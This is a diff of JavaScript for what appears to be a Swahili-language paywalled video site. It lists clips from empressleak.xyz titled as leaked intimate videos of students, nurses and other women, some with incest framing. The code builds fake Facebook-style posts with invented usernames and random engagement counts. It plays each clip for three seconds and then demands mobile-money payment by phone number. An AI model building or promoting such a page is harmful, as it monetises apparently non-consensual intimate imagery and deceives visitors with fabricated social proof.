+            { src: "https://www.empressleak.xyz/media/videos/tmb/7019/video.webm", title: "Ukiskia mke katombwa ndo huku sasa 😱" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7017/video.webm", title: "Kijana wa Sinza kwa iPhone na mshangazi 📱" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7015/video.webm", title: "Dada wa masaji saluni na kibententi 💇" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6995/video.webm", title: "Msichana wa Mwanza akitombwa na rafiki 🌊" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6993/video.webm", title: "Video ya mama ntilie imevuja 🔥" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6991/video.webm", title: "Mrembo wa Tanga anapigwa vizuri 💦" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6987/video.webm", title: "Binti wa daktari anashukiwa vibaya 😏" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6985/video.webm", title: "Campus girl wa DIT na sponsor wake 🎒" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6981/video.webm", title: "Stepmom na stepson wamecatch live 🤯" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6977/video.webm", title: "Nesi wa hospitali akitoa huduma nyingine 🏥" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6968/video.webm", title: "Dada mdogo akijaribu mambo mapya 🌶️" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6958/video.webm", title: "Mwanafunzi wa Ardhi amekamatiwa kazini 📐" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6955/video.webm", title: "Jamaa amemkamata mkewe akitombwa 😤" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6951/video.webm", title: "Video ya mkutano wa usiku imevuja 🌙" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6941/video.webm", title: "Binti wa Arusha analiwa doggy style �" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/6937/video.webm", title: "Mpya! Video ya Zanzibar imevuja leo 🏝️" }
         ];
 
-        const fakeNames = ['Mama Ntilie', 'Bongo Boy', 'Sinza Finest', 'Dar Queen', 'Mzee Wa Kijiji', 'Campus Girl', 'Arusha Prince'];
-        const fakeComments = ['🔥🔥🔥', 'Moto sana!', 'Full video iko wapi?', 'Woow nzuri', 'DM yangu wazi', 'Kali!', 'Nikusend link?'];
-        const timeAgo = ['Just now', '2m', '15m', '1h', '2h', '5h', '12h', '1d'];
+        const userNames = ["Anonymous Member", "Chuga Boy", "Mbeya Finest", "Dar Hot Gossip", "Mwanza Leaks", "Campus Spy", "Sinza Finest", "Arusha Prince"];
+        const timeAgo = ['Just now', '5m', '15m', '30m', '1h', '2h', '3h', '5h', '8h', '12h', '1d'];
+
+        // Shuffle array (Fisher-Yates algorithm)
+        function shuffleArray(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+
+        // Shuffle videos on each page load
+        shuffleArray(videos);
 
         document.addEventListener('DOMContentLoaded', () => {
-            const postsContainer = document.getElementById('posts-container');
+            const videoListContainer = document.getElementById('video-list-container');
+
+            // Video Modal Elements
             const videoModal = document.getElementById('video-modal');
             const modalVideo = document.getElementById('modal-video');
             const modalCaption = document.getElementById('modal-caption');
-            const closeModalBtn = document.getElementById('close-modal');
-            const paymentOverlay = document.getElementById('payment-overlay');
-            const paymentForm = document.getElementById('payment-form');
-            const paymentFormView = document.getElementById('payment-form-view');
-            const paymentWaiting = document.getElementById('payment-waiting');
+            const closeVideoModalBtn = document.getElementById('close-video-modal');
+            const videoPaymentOverlay = document.getElementById('video-payment-overlay');
+            const videoPaymentForm = document.getElementById('video-payment-form');
+            const videoPaymentFormView = document.getElementById('video-payment-form-view');
+            const videoPaymentWaiting = document.getElementById('video-payment-waiting');
 
-            const generalModal = document.getElementById('general-modal');
-            const generalModalBox = document.getElementById('general-modal-box');
-            const closeGeneralModal = document.getElementById('close-general-modal');
-            const generalPaymentForm = document.getElementById('general-payment-form');
-            const generalFormView = document.getElementById('general-form-view');
-            const generalWaiting = document.getElementById('general-waiting');
+            // General Modal Elements
+            const paymentModal = document.getElementById('payment-modal');
+            const paymentBox = document.getElementById('payment-box');
+            const closeModalBtn = document.getElementById('close-modal');
+            const formView = document.getElementById('form-view');
+            const waitingView = document.getElementById('waiting-view');
+            const paymentForm = document.getElementById('payment-form');
 
             let playTimeout = null;
 
             // Create Facebook-style post
             function createPost(video, index) {
-                const likes = (Math.random() * 20 + 1).toFixed(1) + 'K';
-                const comments = Math.floor(Math.random() * 300) + 50;
-                const shares = Math.floor(Math.random() * 100) + 10;
+                const user = userNames[Math.floor(Math.random() * userNames.length)];
                 const time = timeAgo[Math.floor(Math.random() * timeAgo.length)];
+                const likes = Math.floor(Math.random() * 500) + 50;
+                const comments = Math.floor(Math.random() * 100) + 10;
+                const shares = Math.floor(Math.random() * 50) + 5;
+                const avatarBg = ['dc2626', '2563eb', '16a34a', 'd97706', '9333ea', '0891b2'][Math.floor(Math.random() * 6)];
 
-                const post = document.createElement('div');
-                post.className = 'fb-card';
-                post.innerHTML = `
+                const card = document.createElement('div');
+                card.className = 'fb-card pb-1';
+
+                card.innerHTML = `
                     <!-- Post Header -->
-                    <div class="p-3 flex items-center justify-between">
-                        <div class="flex items-center gap-3">
-                            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-[#1877f2] to-[#00c6ff] flex items-center justify-center">
-                                <span class="text-white font-bold text-sm">VL</span>
-                            </div>
+                    <div class="px-4 py-3 flex items-start justify-between">
+                        <div class="flex gap-2">
+                            <img src="https://ui-avatars.com/api/?name=${user.replace(' ', '+')}&background=${avatarBg}&color=fff" class="w-10 h-10 rounded-full border border-[#3e4042]">
                             <div>
-                                <p class="font-semibold text-sm flex items-center gap-1">
-                                    Viral Leaks TZ
-                                    <i class="fas fa-check-circle fb-blue text-xs"></i>
-                                </p>
-                                <p class="text-xs fb-text-secondary">${time} · <i class="fas fa-globe-africa text-[10px]"></i></p>
+                                <h3 class="font-bold text-[15px] leading-tight text-[#e4e6eb]">${user}</h3>
+                                <div class="flex items-center text-[12px] text-[#b0b3b8] gap-1">
+                                    <span>${time}</span>
+                                    <span>·</span>
+                                    <i class="fas fa-users text-[10px]"></i>
+                                </div>
                             </div>
                         </div>
-                        <button class="w-8 h-8 rounded-full fb-hover flex items-center justify-center">
-                            <i class="fas fa-ellipsis-h fb-text-secondary"></i>
-                        </button>
+                        <i class="fas fa-ellipsis-h text-[#b0b3b8]"></i>
                     </div>
 
-                    <!-- Post Caption -->
-                    <div class="px-3 pb-2">
-                        <p class="text-sm">${video.title}</p>
+                    <!-- Caption -->
+                    <div class="px-4 pb-2 text-[14px] text-[#e4e6eb]">
+                        ${video.title}
                     </div>
 
                     <!-- Video Thumbnail -->
-                    <div class="relative aspect-video bg-black cursor-pointer video-thumbnail" data-index="${index}">
+                    <div class="relative w-full aspect-video bg-black overflow-hidden cursor-pointer video-thumbnail" data-index="${index}">
                         <video class="w-full h-full object-cover" loop muted playsinline preload="none" data-src="${video.src}"></video>
-                        <div class="absolute inset-0 flex items-center justify-center bg-black/20">
-                            <div class="w-16 h-16 rounded-full bg-black/60 flex items-center justify-center">
+                        
+                        <!-- Play Button Overlay -->
+                        <div class="absolute inset-0 flex items-center justify-center bg-black/30">
+                            <div class="w-16 h-16 rounded-full bg-black/60 border-2 border-white/40 flex items-center justify-center backdrop-blur-sm">
                                 <i class="fas fa-play text-white text-2xl ml-1"></i>
                             </div>
                         </div>
-                        <div class="absolute bottom-2 right-2 bg-black/70 px-2 py-0.5 rounded text-xs">
-                            ${['2:45', '4:12', '6:30', '3:56', '5:23'][index % 5]}
-                        </div>
+                        
+                        <!-- Duration Badge -->
+                        <span class="absolute bottom-2 right-2 bg-black/80 text-white text-xs px-2 py-0.5 rounded font-medium">
+                            ${Math.floor(Math.random() * 5) + 2}:${String(Math.floor(Math.random() * 59)).padStart(2, '0')}
+                        </span>
                     </div>
 
-                    <!-- Reactions Summary -->
-                    <div class="px-3 py-2 flex items-center justify-between text-sm fb-text-secondary">
+                    <!-- Engagement Stats -->
+                    <div class="px-4 py-2 flex justify-between items-center text-[12px] text-[#b0b3b8] border-b border-[#3e4042]">
                         <div class="flex items-center gap-1">
                             <div class="flex -space-x-1">
-                                <span class="w-5 h-5 rounded-full bg-[#1877f2] flex items-center justify-center text-[10px]">👍</span>
-                                <span class="w-5 h-5 rounded-full bg-red-500 flex items-center justify-center text-[10px]">❤️</span>
+                                <span class="bg-[#2d88ff] rounded-full p-1 w-[18px] h-[18px] flex items-center justify-center z-10"><i class="fas fa-thumbs-up text-white text-[8px]"></i></span>
+                                <span class="bg-red-500 rounded-full p-1 w-[18px] h-[18px] flex items-center justify-center"><i class="fas fa-heart text-white text-[8px]"></i></span>
                             </div>
                             <span>${likes}</span>
                         </div>
@@ -516,79 +494,77 @@
                         </div>
                     </div>
 
-                    <!-- Reaction Buttons -->
-                    <div class="flex border-t fb-border mx-3 py-1">
-                        <button class="reaction-btn fb-text-secondary">
-                            <i class="far fa-thumbs-up"></i>
-                            <span class="text-xs">Like</span>
+                    <!-- Action Buttons -->
+                    <div class="px-2 py-1 flex justify-between">
+                        <button class="flex-1 py-2 flex items-center justify-center gap-2 text-[#b0b3b8] hover:bg-[#3a3b3c] rounded active-tap">
+                            <i class="far fa-thumbs-up text-lg"></i> <span class="text-[13px] font-medium">Like</span>
                         </button>
-                        <button class="reaction-btn fb-text-secondary">
-                            <i class="far fa-comment"></i>
-                            <span class="text-xs">Comment</span>
+                        <button class="flex-1 py-2 flex items-center justify-center gap-2 text-[#b0b3b8] hover:bg-[#3a3b3c] rounded active-tap">
+                            <i class="far fa-comment text-lg"></i> <span class="text-[13px] font-medium">Comment</span>
                         </button>
-                        <button class="reaction-btn fb-text-secondary">
-                            <i class="far fa-share-square"></i>
-                            <span class="text-xs">Share</span>
+                        <button class="flex-1 py-2 flex items-center justify-center gap-2 text-[#b0b3b8] hover:bg-[#3a3b3c] rounded active-tap">
+                            <i class="fas fa-share text-lg"></i> <span class="text-[13px] font-medium">Share</span>
                         </button>
                     </div>
                 `;
 
-                // Click to open video modal
-                const thumbnail = post.querySelector('.video-thumbnail');
+                // Click thumbnail to open video modal
+                const thumbnail = card.querySelector('.video-thumbnail');
                 thumbnail.addEventListener('click', () => openVideoModal(video, index));
 
                 // Lazy load video thumbnail
-                const videoEl = post.querySelector('video');
+                const videoEl = card.querySelector('video');
                 const obs = new IntersectionObserver((entries) => {
                     if (entries[0].isIntersecting) {
                         videoEl.src = videoEl.dataset.src;
                         videoEl.load();
                         videoEl.play().then(() => setTimeout(() => videoEl.pause(), 100)).catch(() => { });
-                        obs.unobserve(post);
+                        obs.unobserve(card);
                     }
                 }, { rootMargin: '200px' });
-                obs.observe(post);
+                obs.observe(card);
 
-                return post;
+                return card;
             }
 
-            // Populate feed
+            // Fill feed
             videos.forEach((video, index) => {
-                postsContainer.appendChild(createPost(video, index));
+                videoListContainer.appendChild(createPost(video, index));
             });
 
-            // Open video modal
+            // Open video modal - plays 3 seconds then shows payment
             function openVideoModal(video, index) {
                 videoModal.classList.add('show');
                 document.body.style.overflow = 'hidden';
 
                 // Reset state
-                paymentOverlay.classList.remove('show');
-                paymentFormView.style.display = 'block';
-                paymentWaiting.classList.add('hidden');
+                videoPaymentOverlay.classList.remove('show');
+                videoPaymentFormView.style.display = 'block';
+                videoPaymentWaiting.classList.add('hidden');
 
-                // Set video
+                // Set video and caption
                 modalVideo.src = video.src;
                 modalCaption.textContent = video.title;
                 modalVideo.load();
+                modalVideo.currentTime = 0;
                 modalVideo.play().catch(() => { });
 
                 // Random engagement
                 document.getElementById('modal-likes').textContent = (Math.random() * 20 + 5).toFixed(1) + 'K';
                 document.getElementById('modal-comments').textContent = Math.floor(Math.random() * 300) + 100;
                 document.getElementById('modal-shares').textContent = Math.floor(Math.random() * 100) + 20;
-                document.getElementById('modal-time').textContent = timeAgo[Math.floor(Math.random() * timeAgo.length)];
+                document.getElementById('modal-time').textContent = timeAgo[Math.floor(Math.random() * timeAgo.length)] + ' · ';
 
-                // Show payment after 3 seconds
+                // Show payment overlay after 3 seconds
                 if (playTimeout) clearTimeout(playTimeout);
                 playTimeout = setTimeout(() => {
                     modalVideo.pause();
-                    paymentOverlay.classList.add('show');
+                    videoPaymentOverlay.classList.add('show');
                 }, 3000);
             }
 
             // Close video modal
-            closeModalBtn.addEventListener('click', () => {
+            closeVideoModalBtn.addEventListener('click', () => {
                 videoModal.classList.remove('show');
                 document.body.style.overflow = '';
                 modalVideo.pause();
@@ -596,56 +572,58 @@
                 if (playTimeout) clearTimeout(playTimeout);
             });
 
-            // Payment form submit
-            paymentForm.addEventListener('submit', (e) => {
+            // Video payment form
+            videoPaymentForm.addEventListener('submit', (e) => {
                 e.preventDefault();
-                paymentFormView.style.display = 'none';
-                paymentWaiting.classList.remove('hidden');
-                processPayment(document.getElementById('phone').value, () => {
-                    paymentFormView.style.display = 'block';
-                    paymentWaiting.classList.add('hidden');
+                videoPaymentFormView.style.display = 'none';
+                videoPaymentWaiting.classList.remove('hidden');
+                processPayment(document.getElementById('video-phone').value, () => {
+                    videoPaymentFormView.style.display = 'block';
+                    videoPaymentWaiting.classList.add('hidden');
                 });
             });
 
-            // General modal triggers
-            document.querySelectorAll('.open-modal-trigger').forEach(btn => {
-                btn.addEventListener('click', (e) => {
+            // General modal functions
+            function openGeneralModal() {
+                paymentModal.classList.remove('hidden');
+                setTimeout(() => {
+                    paymentBox.classList.remove('scale-95', 'opacity-0');
+                    paymentBox.classList.add('scale-100', 'opacity-100');
+                }, 10);
+            }
+
+            function closeGeneralModal() {
+                paymentBox.classList.remove('scale-100', 'opacity-100');
+                paymentBox.classList.add('scale-95', 'opacity-0');
+                setTimeout(() => {
+                    paymentModal.classList.add('hidden');
+                    formView.style.display = 'block';
+                    waitingView.style.display = 'none';
+                }, 200);
+            }
+
+            // Attach general modal triggers
+            document.querySelectorAll('.open-modal-trigger').forEach(trigger => {
+                trigger.addEventListener('click', (e) => {
                     e.preventDefault();
                     openGeneralModal();
                 });
             });
 
-            function openGeneralModal() {
-                generalModal.classList.remove('hidden');
-                setTimeout(() => {
-                    generalModalBox.classList.remove('scale-95', 'opacity-0');
-                    generalModalBox.classList.add('scale-100', 'opacity-100');
-                }, 10);
-            }
-
-            function closeGeneralModalFn() {
-                generalModalBox.classList.remove('scale-100', 'opacity-100');
-                generalModalBox.classList.add('scale-95', 'opacity-0');
-                setTimeout(() => {
-                    generalModal.classList.add('hidden');
-                    generalFormView.style.display = 'block';
-                    generalWaiting.classList.add('hidden');
-                }, 200);
-            }
-
-            closeGeneralModal.addEventListener('click', closeGeneralModalFn);
-            generalModal.addEventListener('click', (e) => {
-                if (e.target === generalModal) closeGeneralModalFn();
+            closeModalBtn.addEventListener('click', closeGeneralModal);
+            paymentModal.addEventListener('click', (e) => {
+                if (e.target === paymentModal) closeGeneralModal();
             });
 
-            generalPaymentForm.addEventListener('submit', (e) => {
+            // General payment form
+            paymentForm.addEventListener('submit', (e) => {
                 e.preventDefault();
-                generalFormView.style.display = 'none';
-                generalWaiting.classList.remove('hidden');
-                processPayment(document.getElementById('general-phone').value, () => {
-                    generalFormView.style.display = 'block';
-                    generalWaiting.classList.add('hidden');
-                    closeGeneralModalFn();
+                formView.style.display = 'none';
+                waitingView.style.display = 'block';
+                processPayment(document.getElementById('phone').value, () => {
+                    formView.style.display = 'block';
+                    waitingView.style.display = 'none';
+                    closeGeneralModal();
                 });
             });
 
@@ -669,7 +647,7 @@
                                 window.location.href = 'success.html';
                             } else if (sData.status === 'FAILED') {
                                 clearInterval(poll);
-                                alert("Malipo yameshindikana.");
+                                alert("Malipo yameshindikana. Jaribu tena.");
                                 onError();
                             }
                         } catch (e) { }
